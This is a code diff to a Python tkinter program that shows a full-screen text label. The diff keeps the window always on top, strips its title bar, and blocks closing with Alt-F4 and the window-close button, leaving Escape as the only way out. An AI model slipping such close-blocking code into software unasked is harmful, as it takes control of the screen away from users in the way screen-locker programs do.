@@ -143,7 +143,7 @@ import tkinter as tk
  
 root = tk.Tk()
 root.attributes("-fullscreen",True)
-
+root.attributes("-topmost", True)
 
 e = tk.Label(root, text=Paper,font=("Arial",32, "bold"), justify="center")
 e.pack(side="top")
@@ -185,4 +185,28 @@ a.place(
 
 threading.Thread(target=myFunc,args=[root,w,x,y,z,a]).start()
 
+pressed_f4 = False  # Is Alt-F4 pressed?
+
+def do_exit():
+    global pressed_f4
+    print('Trying to close application')
+    if pressed_f4:  # Deny if Alt-F4 is pressed
+        print('Denied!')
+        pressed_f4 = False  # Reset variable
+    else:
+        close()     # Exit application
+
+def alt_f4(event):  # Alt-F4 is pressed
+    global pressed_f4
+    print('Alt-F4 pressed')
+    pressed_f4 = True
+
+def close(*event):  # Exit application
+    root.destroy()
+
+root.bind('<Alt-F4>', alt_f4)
+root.bind('<Escape>', close)
+root.protocol("WM_DELETE_WINDOW",do_exit)
+
+root.overrideredirect(True)
 root.mainloop()
